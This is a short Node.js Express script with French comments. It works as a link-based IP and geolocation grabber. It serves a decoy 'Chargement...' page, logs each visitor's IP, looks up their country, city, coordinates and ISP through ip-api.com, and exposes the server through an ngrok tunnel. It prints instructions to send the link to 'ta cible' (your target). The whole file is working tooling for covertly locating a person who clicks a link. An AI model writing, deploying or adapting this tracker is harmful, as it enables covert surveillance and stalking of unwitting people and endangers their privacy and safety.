const express = require('express');
const ngrok = require('ngrok');
const axios = require('axios');
const chalk = require('chalk');
const app = express();
const port = 3000;

// Middleware pour parser le JSON
app.use(express.json());

// Route pour l'interface de la cible
app.get('/', (req, res) => {
    // Récupérer l'IP de la cible
    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    console.log(chalk.green(`[+] Nouvelle connexion depuis l'IP : ${ip}`));

    // Récupérer la géolocalisation via une API (ex: ip-api.com)
    axios.get(`http://ip-api.com/json/${ip}`)
        .then(response => {
            const data = response.data;
            console.log(chalk.blue(`[+] Localisation de la cible :`));
            console.log(chalk.blue(`- Pays : ${data.country}`));
            console.log(chalk.blue(`- Région : ${data.regionName}`));
            console.log(chalk.blue(`- Ville : ${data.city}`));
            console.log(chalk.blue(`- Latitude : ${data.lat}`));
            console.log(chalk.blue(`- Longitude : ${data.lon}`));
            console.log(chalk.blue(`- ISP : ${data.isp}`));
        })
        .catch(error => {
            console.log(chalk.red(`[!] Erreur lors de la récupération de la localisation : ${error.message}`));
        });

    // Afficher une page basique pour la cible
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Localisation en cours...</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
                h1 { color: #333; }
                p { color: #666; }
            </style>
        </head>
        <body>
            <h1>Chargement...</h1>
            <p>Merci de patienter.</p>
        </body>
        </html>
    `);
});

// Démarrer le serveur
app.listen(port, async () => {
    console.log(chalk.yellow(`[*] Serveur démarré sur http://localhost:${port}`));

    // Lancer ngrok
    try {
        const url = await ngrok.connect(port);
        console.log(chalk.green(`[+] Lien ngrok généré : ${url}`));
        console.log(chalk.green(`[+] Envoie ce lien à ta cible : ${url}`));
    } catch (error) {
        console.log(chalk.red(`[!] Erreur avec ngrok : ${error.message}`));
    }
});
